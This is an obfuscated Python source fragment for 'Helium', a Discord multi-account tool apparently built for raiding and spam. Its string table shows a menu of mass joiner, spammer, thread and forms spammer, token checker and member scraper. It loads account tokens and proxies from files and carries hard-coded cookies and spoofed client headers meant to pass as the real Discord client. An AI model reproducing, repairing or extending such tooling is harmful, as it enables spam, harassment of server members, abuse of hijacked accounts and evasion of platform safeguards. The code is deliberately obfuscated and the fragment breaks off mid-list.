class mrHh0rs5vNLzaQRlNcY15hDXqxEdYmie(𝘪𝗻𝙩):...

class dQHtYdyN2PVQQFRpCfd05RPsjDCAV0PZ(𝘀𝘵𝗿):...

class XuXKDhw_THmeZeiP2kd3uGxqukYjuE3G(𝙨𝘁𝙧):...

class fJc0SycIBMaOGL5xXMFmq_9TAEjbw3ZS(𝗶𝗻𝘁):...

class xQaKaGUMihi1qqkY6vgXJjs0tCuALAMU(𝘪𝘯𝘵):...

class NL0TwUro5JFBv6HgikVr9KhPHgJo8BC0(𝘪𝘯𝘵):...

class lItsHZTlyvUNaUSy25ZfMxe_GFDEVxWR(𝘪𝗻𝘁):...

class UGjompxEmSzLWKFS65KuHRbLNRK_PE72(𝙞𝙣𝘁):...

class V_rm7LVw1X5NBZj8VmtAVSJdEJruc0no(𝘧𝗹𝘰𝙖𝘁):...

class fMXktjkqsprIKE8siPoY5J9JbZ6BUbaj(𝘧𝗹𝗼𝘢𝘵):...

class hxzhDh3h6ViYqNapaLgc6KgTUvH7UGnz(𝘪𝙣𝙩):...

class KbrVqZrQKPVYJ9EhdKzPLEeog33dHzC8(𝗺𝙧𝘏𝙝0𝘳𝘀5𝘷𝘕𝗟𝘻𝙖𝙌𝘙𝗹𝗡𝙘𝗬15𝗵𝗗𝗫𝙦𝘅𝙀𝗱𝗬𝙢𝙞𝙚):...

class XO8AVn_scKTQMAoxcBslryckES40M9XQ(𝙙𝘘𝗛𝙩𝙔𝘥𝘺𝙉2𝗣𝙑𝘘𝗤𝘍𝙍𝗽𝘾𝙛𝙙05𝗥𝘗𝙨𝘫𝘋𝘾𝗔𝘝0𝗣𝙕):...

class YYyif5MwfyMMbl8fct5w6jU8bMTSA6rZ(𝙓𝘶𝙓𝘒𝗗𝙝𝘄_𝘛𝘏𝗺𝗲𝗭𝗲𝘪𝘗2𝗸𝘥3𝙪𝘎𝙭𝘲𝘶𝘬𝘠𝗷𝙪𝗘3𝙂):...

class pGEQo7Fe4i74WSQnBqrH3pgBtpbXmjTU(𝘧𝘑𝙘0𝙎𝘺𝗰𝙄𝘉𝘔𝗮𝗢𝘎𝘓5𝙭𝙓𝘔𝙁𝙢𝙦_9𝘛𝘼𝗘𝘫𝗯𝘄3𝘡𝙎):...

class HTS6xFHlQt3Yz4bxSw1MzZO0Hdk1V09i(𝙭𝗤𝘢𝙆𝙖𝙂𝘜𝙈𝙞𝙝𝙞1𝗾𝗾𝗸𝙔6𝙫𝙜𝗫𝘑𝙟𝘴0𝘁𝘾𝙪𝗔𝗟𝘼𝘔𝘜):...

class oz6wFhHrxnpcsbL9HAIjnAYwUEwwEHrC(𝙉𝗟0𝙏𝙬𝘜𝙧𝘰5𝗝𝘍𝘉𝘃6𝘏𝘨𝘪𝙠𝘝𝙧9𝘒𝗵𝗣𝘏𝙜𝗝𝗼8𝘉𝗖0):...

class EqciVrrKiX8SBHxKCTQl0iUBQYlHVZch(𝗹𝗜𝘁𝘀𝗛𝙕𝙏𝘭𝙮𝘃𝙐𝗡𝙖𝘜𝙎𝘆25𝘡𝘧𝗠𝘅𝗲_𝗚𝘍𝘿𝗘𝗩𝙭𝙒𝘙):...

class MJNLP5wkLlJK0ZPnVXvDHsXHGZs6UfdX(𝙐𝘎𝙟𝙤𝗺𝙥𝘹𝘌𝗺𝗦𝘇𝗟𝙒𝙆𝙁𝙎65𝗞𝘶𝘏𝗥𝘣𝗟𝙉𝘙𝙆_𝗣𝗘72):...

class xAgPXMbtDiICLNP59An0Hs3MH0_c1jrT(𝗩_𝙧𝘮7𝗟𝙑𝙬1𝗫5𝗡𝗕𝘡𝗷8𝗩𝙢𝘁𝘼𝗩𝙎𝙅𝙙𝗘𝗝𝘳𝘂𝙘0𝙣𝙤):...

class io84UT98QsY9SsrGPB_g5SVwW94zmId7(𝙛𝘔𝘟𝗸𝙩𝗷𝗸𝗾𝘀𝙥𝗿𝗜𝘒𝘌8𝘀𝙞𝗣𝙤𝘠5𝙅9𝙅𝘣𝗭6𝘽𝘜𝘣𝙖𝗷):...

class mi3R7K6MqK3OhGTsrEqO1U0TmTTwmcSg(𝙝𝘅𝘻𝘩𝘋𝙝3𝙝6𝙑𝘪𝙔𝘲𝘕𝙖𝗽𝗮𝘓𝗴𝗰6𝙆𝗴𝘛𝗨𝘷𝗛7𝗨𝘎𝙣𝘇):...

class cFLA4pCWdT4hxJ6_QUcxCFiWBLXpMeig(𝙆𝙗𝘳𝗩𝙦𝘡𝗿𝘘𝙆𝗣𝙑𝙔𝘑9𝙀𝙝𝙙𝗞𝙯𝘗𝗟𝙀𝗲𝘰𝗴33𝘥𝙃𝘻𝘊8):...

class MQjknYxGygWRadAsMOBofQHw6xUwWsQC(𝗫𝙊8𝘈𝘝𝙣_𝘴𝙘𝗞𝙏𝘘𝗠𝘼𝙤𝘅𝘤𝘽𝘀𝙡𝗿𝙮𝙘𝗸𝘌𝘚40𝘔9𝘟𝙌):...

class Yoi3BvtQD7P5x8ckOaO3_fIkf7sxJi6x(𝗬𝙔𝘆𝗶𝘧5𝘔𝘸𝗳𝘺𝘔𝗠𝘣𝙡8𝗳𝗰𝘵5𝘄6𝙟𝗨8𝗯𝙈𝙏𝗦𝗔6𝘳𝗭):...

class A0yCwRhHtZlnwSeQTWCMBMRx7h6Jce7B(𝙥𝘎𝘌𝘘𝙤7𝘍𝘦4𝙞74𝙒𝗦𝘘𝙣𝘉𝘲𝘳𝘏3𝘱𝙜𝘽𝙩𝗽𝘣𝘟𝗺𝙟𝘛𝙐):...

class QWqCJj8So8rUG9Fh9wSfF5bG0M6v5h9D(𝗛𝘛𝘚6𝘹𝙁𝙃𝘭𝗤𝘁3𝗬𝙯4𝘣𝘅𝗦𝙬1𝙈𝘻𝘡𝘖0𝙃𝙙𝙠1𝙑09𝗶):...

class MHTXBazDisqkA9tKVmlNQ4B0UfxkItKe(𝙤𝙯6𝘸𝗙𝙝𝘏𝘳𝘹𝗻𝙥𝘤𝘀𝗯𝗟9𝘏𝘼𝘐𝘫𝘯𝘼𝗬𝘸𝗨𝘌𝙬𝘄𝙀𝙃𝙧𝗖):...

class UNV0V7YuIaKTQcl9ynULE0TC6EN8EyCr(𝗘𝗾𝙘𝙞𝘝𝘳𝗿𝙆𝘪𝙓8𝙎𝘽𝗛𝘹𝘒𝘾𝗧𝙌𝘭0𝙞𝗨𝘉𝘘𝙔𝙡𝘏𝙑𝗭𝙘𝙝):...

class qTokUN8uWNuKHdBXWC2qv653cmc6LCdz(𝙈𝗝𝙉𝙇𝗣5𝘸𝙠𝗟𝙡𝗝𝙆0𝙕𝘗𝗻𝗩𝘟𝘷𝗗𝙃𝘀𝘟𝙃𝘎𝘡𝘀6𝙐𝘧𝘥𝙓):...

class m4KwIdHfiAxQPcFui1YAddnRDlGWc1Q0(𝘅𝘈𝗴𝙋𝗫𝘔𝙗𝘵𝘿𝘪𝗜𝘾𝗟𝗡𝙋59𝗔𝙣0𝘏𝘀3𝙈𝘏0_𝙘1𝙟𝗿𝙏):...

class GKadYKByV2E17S_8rFoind6Sews9uuaU(𝗶𝙤84𝘜𝗧98𝙌𝘴𝗬9𝘚𝙨𝗿𝘎𝙋𝗕_𝗴5𝙎𝗩𝙬𝘞94𝘇𝙢𝙄𝘥7):...

class jxlMt8VkfbVxrPSp56eONVavfEpbWeso(𝗺𝘪3𝘙7𝗞6𝙈𝗾𝗞3𝙊𝗵𝗚𝗧𝘀𝙧𝙀𝗾𝙊1𝘜0𝙏𝙢𝘛𝗧𝘸𝘮𝗰𝙎𝗴):...

class BvjsPaZzmSjl3t62f0d5KaSk4A7Ktq0y(𝗰𝘍𝗟𝘼4𝗽𝗖𝗪𝘥𝙏4𝘩𝙭𝙅6_𝘘𝗨𝘤𝘹𝘾𝘍𝘪𝙒𝘽𝘓𝘟𝘱𝘔𝘦𝗶𝗴):...

class GCslaeR8lrgQxUTJOHMRMhCVfwXt2TMm(𝘔𝗤𝗷𝘬𝙣𝙔𝘅𝗚𝘆𝗴𝗪𝘙𝘢𝗱𝘈𝙨𝗠𝗢𝗕𝘰𝙛𝙌𝗛𝘸6𝘅𝗨𝘸𝙒𝘴𝘘𝘾):...

class UqO6B5OS6M3PHViMYYW9d1sMLCsojn0C(𝙔𝗼𝘪3𝘽𝙫𝙩𝗤𝘋7𝙋5𝙭8𝗰𝙠𝙊𝘢𝙊3_𝗳𝗜𝙠𝘧7𝙨𝘹𝗝𝙞6𝙭):...

class qsF_QC7EEVhHhFeADjNmH7_vJrNdsYNZ(𝘈0𝙮𝘾𝙬𝘙𝙝𝗛𝙩𝘡𝘭𝗻𝘸𝙎𝘦𝘘𝙏𝘞𝘊𝙈𝗕𝘔𝘙𝘹7𝘩6𝘑𝘤𝗲7𝘽):...

class u28kCibcVueL_GFMy18ZNzJ8PqWwY7H_(𝙌𝘞𝗾𝗖𝙅𝗷8𝗦𝙤8𝗿𝘜𝙂9𝙁𝗵9𝘸𝘚𝗳𝗙5𝘣𝙂0𝘔6𝘷5𝘩9𝘿):...

class d20c6IMfCys6mWeECszvk5cu5FHIydUv(𝙈𝙃𝘛𝘟𝗕𝗮𝙯𝗗𝗶𝘴𝘲𝗸𝘼9𝘁𝙆𝗩𝗺𝙡𝗡𝙌4𝘉0𝗨𝘧𝙭𝘬𝘐𝘵𝘒𝗲):...

class ZXviOIsDkxNYU3EjrKi9ANkS6eyGYTBw(𝙐𝘕𝘝0𝙑7𝗬𝙪𝙄𝘢𝘒𝘛𝘘𝘤𝗹9𝙮𝗻𝘜𝙇𝙀0𝘛𝘾6𝘌𝘕8𝙀𝙮𝘾𝘳):...

class NhBxaQhgPOD4c2PAJwgt5Qsoh4yMKAEq(𝗾𝘛𝘰𝗸𝘜𝗡8𝙪𝘞𝙉𝘂𝗞𝘏𝙙𝘽𝙓𝙒𝘾2𝗾𝘷653𝗰𝘮𝙘6𝘓𝘊𝗱𝘇):...

class mOSBpe3QtgYWltGM9mYHZjPdjAVoEBYW(𝙢4𝙆𝘸𝗜𝗱𝙃𝘧𝘪𝘈𝘅𝙌𝙋𝘤𝗙𝙪𝗶1𝙔𝘈𝘥𝘥𝙣𝗥𝘿𝘭𝙂𝙒𝗰1𝗤0):...

class gMftqB4JUavFeYu2YNpDgg2iIl5F4pF5(𝗚𝘒𝗮𝙙𝙔𝗞𝘽𝙮𝙑2𝘌17𝗦_8𝙧𝘍𝗼𝙞𝘯𝘥6𝘚𝗲𝘸𝙨9𝙪𝘶𝗮𝙐):...

class j68LhIdTkfDsVhBzxFzpSIlbNK9aPSXa(𝘫𝙭𝗹𝗠𝘵8𝗩𝘬𝗳𝘣𝗩𝙭𝘳𝘗𝘚𝙥56𝘦𝗢𝗡𝙑𝙖𝘷𝘧𝘌𝗽𝙗𝙒𝗲𝘀𝙤):...

class RtkMqr9BVlbNPvr9VvxJQjz7BxsRFNpt(𝘽𝙫𝗷𝙨𝗣𝗮𝘡𝘻𝗺𝙎𝗷𝙡3𝙩62𝗳0𝙙5𝘒𝗮𝗦𝘬4𝘈7𝗞𝘵𝘲0𝘆):...

class LMJne5pLZJCrM1KEaZrXUVqN4tAvtAmg(𝗚𝘾𝘴𝘭𝗮𝘦𝗥8𝙡𝙧𝘨𝘘𝙭𝘜𝗧𝘑𝙊𝙃𝗠𝘙𝘔𝘩𝗖𝙑𝙛𝘸𝗫𝘵2𝗧𝗠𝗺):...

class OHDzVIyr5XSzNIQQfnXr7085G75r6QzI(𝙐𝘲𝘖6𝗕5𝗢𝘚6𝙈3𝙋𝙃𝙑𝙞𝗠𝙔𝘠𝘞9𝘥1𝘀𝗠𝗟𝘊𝙨𝗼𝙟𝘯0𝘾):...

class ANesU0myai6tlZwRP0PuXf_V7_Fbaymd(𝙦𝘴𝗙_𝗤𝗖7𝙀𝙀𝗩𝗵𝘏𝙝𝗙𝗲𝘼𝗗𝗷𝙉𝘮𝙃7_𝘷𝘑𝗿𝙉𝙙𝘴𝗬𝙉𝗭):...

class Qo2vkO0Uq6Kodk30CYjzGP1nw5lFdMmu(𝘶28𝗸𝗖𝙞𝘣𝗰𝙑𝙪𝗲𝘓_𝗚𝗙𝗠𝙮18𝗭𝙉𝘻𝙅8𝗣𝗾𝗪𝙬𝙔7𝗛_):...

class i_qlOREM1SIHT6TVorVF2XdaVanVrxrN(𝘥20𝗰6𝙄𝗠𝙛𝘊𝙮𝙨6𝘮𝗪𝙚𝙀𝘊𝘀𝘇𝘃𝘬5𝙘𝘶5𝗙𝙃𝗜𝘆𝗱𝙐𝙫):...

class JActDSySlxEw0648nwB8XQKB1aH8Mwbc(𝗭𝗫𝘷𝗶𝘖𝘐𝘴𝗗𝗸𝘅𝘕𝙔𝘜3𝘌𝘫𝘳𝙆𝗶9𝘈𝗡𝗸𝗦6𝗲𝘆𝙂𝘠𝗧𝘽𝘸):...

class WZJWZSlo_SCZX3J_8SHz3qVdma36WsXH(𝗡𝙝𝘉𝘹𝘢𝘘𝗵𝙜𝘗𝙊𝘿4𝙘2𝙋𝘼𝗝𝘄𝗴𝙩5𝗤𝙨𝗼𝘩4𝘆𝘔𝘒𝗔𝗘𝗾):...

class L9b7ZzU3jH9N6AZn0C_FWNM35ZFBXW9T(𝙢𝘖𝘚𝘉𝙥𝗲3𝘘𝙩𝙜𝙔𝙒𝙡𝘵𝘎𝙈9𝗺𝗬𝗛𝘡𝗷𝙋𝗱𝗷𝗔𝘝𝗼𝘌𝗕𝗬𝙒):...

class Z98QVo7CoH_ZlUYjjwOIzUGbCR3SZats(𝘨𝗠𝗳𝘵𝙦𝘽4𝗝𝘜𝗮𝘃𝗙𝗲𝗬𝘂2𝘠𝗡𝙥𝗗𝙜𝙜2𝘪𝘐𝘭5𝙁4𝘱𝙁5):...

class fEyGT6mveBUzQjTRH2LArzRPsJ9bLFcv(𝙟68𝙇𝘩𝘐𝘥𝘛𝗸𝘧𝘋𝙨𝙑𝘩𝘉𝘻𝘹𝗙𝘇𝘱𝘚𝘐𝘭𝙗𝗡𝘒9𝙖𝗣𝘚𝗫𝘢):...

class zIeIas31oJyVKiMUITzdPbDT_jb1mDdr(𝘓𝘔𝙅𝗻𝗲5𝘱𝘓𝘡𝗝𝘾𝗿𝘔1𝘒𝙀𝘢𝗭𝘳𝙓𝘜𝘝𝗾𝗡4𝙩𝘼𝘷𝙩𝘈𝗺𝙜):...

class pm7IVYBjBysXZh3p07UuAgeJjSmFJbQ8(𝗢𝘏𝘿𝙯𝙑𝙄𝘺𝗿5𝘟𝙎𝘇𝘕𝗜𝙌𝙌𝙛𝘯𝗫𝙧7085𝗚75𝙧6𝙌𝘻𝗜):...

class TEp5pqPCCbnErchcxP6gjgagTwsMy9TL(𝗔𝗡𝘦𝘴𝙐0𝘮𝘆𝘢𝗶6𝙩𝘭𝗭𝙬𝗥𝙋0𝗣𝙪𝙓𝙛_𝗩7_𝙁𝘣𝙖𝘺𝙢𝘥):...

class LTEViI6BJpGbTjY2shySNnZblXxBRiyL(𝙌𝘰2𝙫𝗸𝗢0𝘜𝘲6𝙆𝙤𝙙𝙠30𝗖𝙔𝗷𝘻𝗚𝘗1𝘯𝙬5𝙡𝘍𝗱𝘔𝘮𝘶):...

class QgMKlAV2owXSaAo6xXvGZNkWjRYxjE0A(𝘪_𝙦𝗹𝗢𝗥𝙀𝗠1𝙎𝘐𝗛𝗧6𝗧𝗩𝙤𝙧𝙑𝘍2𝗫𝙙𝗮𝙑𝗮𝙣𝗩𝘳𝘹𝗿𝙉):...

class aWbMsW1v_sQ7YPtn5cAH9ykzbXd3KHCX(𝙇9𝘣7𝘡𝘻𝗨3𝙟𝙃9𝘕6𝘼𝘡𝙣0𝗖_𝗙𝗪𝘕𝗠35𝙕𝙁𝘉𝘟𝗪9𝙏):...

class MNxlQqIq1l74ve6Rbn5cr5akEef_6Axm(𝗭98𝙌𝗩𝘰7𝘊𝘰𝗛_𝘡𝗹𝘜𝙔𝘫𝘫𝙬𝘖𝙄𝘇𝙐𝙂𝘣𝗖𝘙3𝙎𝙕𝙖𝘵𝘴):...

class Hd42hZwg354WFQ9yvvMJsUA1HEd9muU2(𝗳𝙀𝙮𝘎𝗧6𝙢𝘃𝘦𝘽𝘜𝘇𝗤𝗷𝘛𝙍𝘏2𝗟𝘈𝙧𝙯𝘙𝘗𝘀𝘑9𝘣𝙇𝙁𝘤𝙫):...

class RsBSmSF0dTnqTKJOT2zO1rTVtkPSaHiW(𝘻𝗜𝗲𝘐𝘢𝘴31𝙤𝙅𝘆𝙑𝘒𝙞𝙈𝙐𝙄𝙏𝙯𝘥𝗣𝙗𝘿𝘛_𝘫𝙗1𝙢𝗗𝘥𝗿):...

class c8ReCtMjMzF157trr1pmD2YkyasTkulh(𝗽𝗺7𝘐𝘝𝘠𝗕𝗷𝘉𝘺𝘴𝘟𝙕𝙝3𝙥07𝙐𝘶𝗔𝘨𝗲𝙅𝗷𝙎𝗺𝘍𝙅𝗯𝙌8):...

class UHdbKjCRYKGuNx5_kcpn6cMvtZ1q6mdl(𝗧𝙀𝘱5𝙥𝙦𝘗𝗖𝘾𝙗𝗻𝘌𝙧𝘤𝙝𝙘𝘅𝗣6𝘨𝘫𝗴𝗮𝗴𝘛𝘄𝙨𝙈𝘺9𝙏𝗟):...

class cJUgMTLXe_X8r7GVUO35aDWrHmfBQAOS(𝙇𝗧𝗘𝙑𝘪𝘐6𝘽𝘑𝗽𝗚𝗯𝙏𝘫𝙔2𝘀𝙝𝙮𝗦𝙉𝘯𝘡𝙗𝘭𝗫𝘅𝘉𝗥𝘪𝘆𝙇):...

class NcniySdFyEuiDP3SdfovXY4K1NjLGuMR(𝗤𝘨𝙈𝗞𝘭𝗔𝙑2𝗼𝘄𝗫𝗦𝗮𝗔𝗼6𝘹𝗫𝘷𝗚𝗭𝙉𝙠𝙒𝗷𝘙𝗬𝘅𝘫𝙀0𝗔):...

class Z7c3AVRR5TUbrRHTL7dwrpKAyBlNlRO4(𝙖𝙒𝗯𝗠𝘀𝗪1𝙫_𝘴𝗤7𝗬𝘗𝘵𝙣5𝙘𝘼𝘏9𝘺𝗸𝙯𝘣𝘟𝘥3𝙆𝘏𝘊𝘟):...

class VmOda2fcynTYMuCLUV0XcWib5MCpasP8(𝘔𝗡𝘅𝘭𝗤𝙦𝙄𝘲1𝙡74𝘷𝗲6𝙍𝘣𝗻5𝙘𝘳5𝗮𝘬𝘌𝘦𝙛_6𝗔𝘅𝗺):...

class HDSX97RzCTqHTN6G7X7x1Sghb7rlCCJR(𝙃𝗱42𝙝𝙕𝙬𝘨354𝙒𝙁𝙌9𝙮𝘷𝘃𝘔𝗝𝙨𝘜𝗔1𝘏𝗘𝗱9𝙢𝘂𝗨2):...

class Arj28uLsjY57Pw72NlQS56U2u1mcpU90(𝗰8𝗥𝘦𝘊𝘵𝗠𝘫𝗠𝘇𝗙157𝘁𝙧𝘳1𝘱𝘮𝘿2𝘠𝘬𝘆𝘢𝘴𝗧𝗸𝙪𝙡𝙝):...

class fZ6yY6Kqhel47cJtmUFcxcqlKTJefVGE(𝗨𝘏𝗱𝘣𝘒𝙟𝗖𝗥𝗬𝙆𝙂𝘶𝗡𝘅5_𝗸𝙘𝗽𝘯6𝗰𝙈𝘃𝘵𝙕1𝘲6𝙢𝗱𝗹):...

class X3HTC7ANAl4I2H5aMNzjhPRKveaEMLvV(𝗰𝗝𝗨𝗴𝘔𝙏𝙇𝘟𝙚_𝗫8𝗿7𝙂𝗩𝗨𝘖35𝗮𝘋𝗪𝘳𝗛𝘮𝗳𝘽𝙌𝗔𝘖𝘚):...

class YXrvjx3OvRnbnncwD8LNOBJv6sxD0L6W(𝙕7𝘤3𝘈𝙑𝙍𝗥5𝘛𝘜𝘣𝙧𝘙𝙃𝗧𝗟7𝗱𝘸𝘳𝙥𝙆𝘈𝘆𝗕𝘭𝗡𝗹𝘙𝘖4):...

class PmMhwCZncdr825gJ7JitJmqXTScXKQEW(𝘝𝙢𝘖𝘥𝙖2𝗳𝗰𝘺𝗻𝘛𝗬𝙈𝘶𝘾𝗟𝙐𝗩0𝗫𝗰𝘞𝗶𝗯5𝙈𝘊𝘱𝗮𝘴𝘗8):...

class kehmubmqjeRsCTu2STvlOEVqCYj9zQOR(𝙃𝗗𝘚𝘟97𝙍𝘻𝘾𝘛𝘲𝙃𝗧𝙉6𝙂7𝙓7𝙭1𝙎𝘨𝘩𝙗7𝙧𝘭𝗖𝘾𝘑𝘙):...

class cG_f5MTcKPEdvbJl3JKiQIZHMpCLSPYS(𝘼𝘳𝙟28𝘶𝘓𝘀𝙟𝙔57𝘗𝙬72𝙉𝘭𝘘𝙎56𝗨2𝘂1𝗺𝘤𝙥𝘜90):...

class U1vPh4JCHpsFHnsMcJIWyZP8DvLw0_Gp(𝘧𝘡6𝙮𝙔6𝗞𝘲𝘩𝗲𝗹47𝙘𝗝𝘵𝗺𝘜𝗙𝘤𝘹𝘤𝘲𝙡𝗞𝗧𝗝𝙚𝙛𝗩𝗚𝙀):...

class QKwFOErd_tuj4W1rl9W9N6b9WYG_OtB_(𝙓3𝗛𝗧𝗖7𝗔𝙉𝗔𝗹4𝙄2𝘏5𝙖𝘔𝙉𝘻𝗷𝗵𝗣𝘙𝘒𝘷𝗲𝘢𝘌𝗠𝙇𝘷𝗩):...

class Nrd480ajQyiD9HcFztra2_1hbOfpoD8e(𝙔𝘟𝘳𝙫𝙟𝘅3𝗢𝙫𝗥𝘯𝗯𝗻𝗻𝙘𝘸𝘋8𝗟𝗡𝘖𝘽𝙅𝘃6𝘀𝙭𝘿0𝙇6𝘞):...

class QVPT636mlsju4QcguFYquZl9flHqZ46E(𝗣𝙢𝙈𝙝𝙬𝘾𝗭𝙣𝗰𝗱𝘳825𝙜𝘑7𝘑𝗶𝙩𝗝𝙢𝙦𝘟𝘛𝗦𝘤𝙓𝗞𝘘𝗘𝙒):...

class iUMsVhNGPDWb6wfyFBEPd7HchlbwMEif(𝙘𝙂_𝙛5𝘔𝘛𝗰𝗞𝗣𝗘𝙙𝘷𝘣𝙅𝙡3𝘑𝙆𝗶𝘘𝗜𝗭𝗛𝙈𝗽𝗖𝘓𝗦𝘗𝘠𝙎):...

class t5l_l3PSjIrXHLLpIzXryoVZ1YJirA_x(𝗨1𝙫𝘗𝙝4𝗝𝘾𝘏𝘱𝘴𝙁𝙃𝘯𝙨𝘔𝗰𝘑𝘐𝘞𝙮𝘡𝙋8𝘋𝘃𝗟𝘄0_𝗚𝙥):...

class vRSpabhMyx18kHy1EnJazRGWoOgr6N6K(𝙌𝗞𝙬𝙁𝙊𝙀𝘳𝗱_𝙩𝘶𝗷4𝘞1𝘳𝘭9𝘞9𝗡6𝗯9𝙒𝘠𝙂_𝘖𝘁𝘽_):...
𝙈𝘔𝙉𝗜𝗠𝘐𝙈𝙄𝘭𝗠𝗡𝗡𝗠𝙉𝗹𝙈𝙈𝙡𝙈𝙄𝙡𝗜𝘕𝗜𝘕𝙉𝗜𝙈𝗡𝘕𝘐𝘭 = ['title Helium - starting up', 'cls', 'pip install colorama > nul', 'pip install os.path > nul', 'pip install pathlib > nul', 'pip install threading > nul', 'pip install websocket > nul', 'pip install websocket_client > nul', 'pip install tls_client > nul', 'pip install requests > nul', 'pip install datetime > nul', 'pip install emoji > nul', 'pip install base64 > nul', 'pip install uuid > nul', 'pip install time > nul', 'pip install subprocess > nul', 'pip install hashlib > nul', 'data', 'avatars', 'title Helium - First Time Install', 'tokens.txt', 'w', '', 'proxies.txt', 'members.txt', 'config.json', '{"proxy": false, "rgb": [255, 130, 0]}', 'utf8', 'proxies', 'data/proxies.txt', 'r', 'chrome_116', '     \n                                  ██', '╗  ', '██', '╗', '███████', '╗     ', '╗   ', '███', '╗\n                                  ', '║  ', '║', '╔════╝', '║     ', '║   ', '████', '╗ ', '\n                                  ███████', '█████', '╔', '\n                                  ██', '╔══', '╔══╝  ', '║╚', '╔╝', '██████', '║ ╚═╝ ', '║\n                                  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝', 'data/tokens.txt', '╚', '╝', '═', '\n', '██╗  ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗', '██║  ██║██╔════╝██║     ██║██║   ██║████╗ ████║', '███████║█████╗  ██║     ██║██║   ██║██╔████╔██║', '██╔══██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║', '██║  ██║███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║', '╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝', '\n\n', '                      ', ' Loaded ‹', '› tokens | Loaded ‹', '> proxies', '»', '«', '─', '╭', '│', '╰', '╯', '╮', '╭─────────────────────────────────────────────────────────────────────────────────────────────╮', '│ «01» Joiner            «06» Token Formatter    «11» Onliner          «16» ???               │', '│ «02» Leaver            «07» Button Click       «12» Voice Joiner     «17» ???               │', '│ «03» Spammer           «08» Accept Rules       «13» Change Nick      «18» ???               │', '│ «04» Token Checker     «09» Guild Check        «14» Thread Spammer   «19» ???               │', '│ «05» Reactor           «10» Bio Changer        «15» Forms Spammer    «20» Exit              │', '╰─────────────────────────────────────────────────────────────────────────────────────────────╯', 'title Helium', '[', '%H:%M:%S', '] ', ' (', ')', '? ', '(y/n)', ' ', ']: ', 'https://discord.com', '; ', '=', '__dcfduid=5e271e90481111eea67b61f9ac35724f; __sdcfduid=5e271e91481111eea67b61f9ac35724fbc3b6eb338d8f68fc5c82cf05c36e65b4ab6e19dd28c901f1e5e6236f69238a5; __cfruid=376f640a0e40236d1f38bc93ea51e6f430ae37e8-1693494992; _cfuvid=nQDMUQwYTyGceEcJFREhptuDgpRwpQYaeQ7UXlggUto-1693494992639-0-604800000', '(ERR): ', ' (get_discord_cookies)', 'os', 'browser', 'release_channel', 'client_version', 'os_version', 'os_arch', 'system_locale', 'browser_user_agent', 'browser_version', 'client_build_number', 'native_build_number', 'client_event_source', 'Windows', 'Discord Client', 'stable', '1.0.9017', '10.0.19045', 'x64', 'en', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chromium/108.0.5359.215 Electron/22.3.12', '22.3.12', 'authority', 'accept', 'accept-language', 'authorization', 'cookie', 'content-type', 'user-agent', 'x-discord-locale', 'x-super-properties', 'discord.com', '*/*', 'application/json', 'en-US', 'title Helium - Joiner', 'session_id', 'https://discord.com/api/v9/invites/', 'JOINED', ' (.gg/', 'CAPTCHA', 'RATELIMITED', 'FAILED', 'message', 'ERROR', ' (joiner)', 'title Helium - Leaver', 'https://discord.com/api/v9/guilds/', 'name', 'lurking', 'https://discord.com/api/v9/users/@me/guilds/', 'LEFT', ']', 'online_count', 'member_count', 'id', 'guild_id', 'hoisted_roles', 'types', 'locations', 'updates', 'd', 'groups', 'ops', 'op', 'SYNC', 'INVALIDATE', 'range', 'items', 'INSERT', 'UPDATE', 'DELETE', 'index', 'item', 'Accept-Encoding', 'Accept-Language', 'Cache-Control', 'Pragma', 'Sec-WebSocket-Extensions', 'User-Agent', 'gzip, deflate, br', 'en-US,en;q=0.9', 'no-cache', 'permessage-deflate; client_max_window_bits', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0', 'wss://gateway.discord.gg/?encoding=json&v=9', '{"op":14,"d":{"guild_id":"', '","typing":true,"activities":true,"threads":true,"channels":{"', '":', '}}}', '{"op":2,"d":{"token":"', '","capabilities":125,"properties":{"os":"Windows NT","browser":"Chrome","device":"","system_locale":"it-IT","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","browser_version":"116.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":103981,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}', '{"op":1,"d":', '}', 'heartbeat_interval', 't', 'READY', 'guilds', 'READY_SUPPLEMENTAL', 'GUILD_MEMBER_LIST_UPDATE', 'member', 'tag', 'user', 'username', '#', 'discriminator', 'bot', 'data/members.txt', 'w+', 'no valid tokens in guild', 'a+', ' -  || <@!', '> |||| <@!', '> ||', 'Authorization', 'content-length', 'origin', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'x-debug-options', 'x-discord-timezone', 'pl', '0', '__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __stripe_mid=95b0994a-5555-4ae2-a529-19de05e8a84261fc41; cf_clearance=ipf6ofbR8N9QZhQ1Oo0kyIrHeAY3IaG.fFDwKzznKCI-1694246626-0-1-a544f47e.ac16d7c4.fcbd86dd-0.2.1694246626; __cfruid=af646639dffe9110a3a9de9f0e1ebd2752a01153-1694278928; __stripe_sid=e54ed780-00b5-44d5-a066-1ea1092a1644ec258f', '"Not?A_Brand";v="8", "Chromium";v="108"', '?0', '"Windows"', 'empty', 'cors', 'same-origin', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9017 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'bugReporterEnabled', 'Europe/Warsaw', 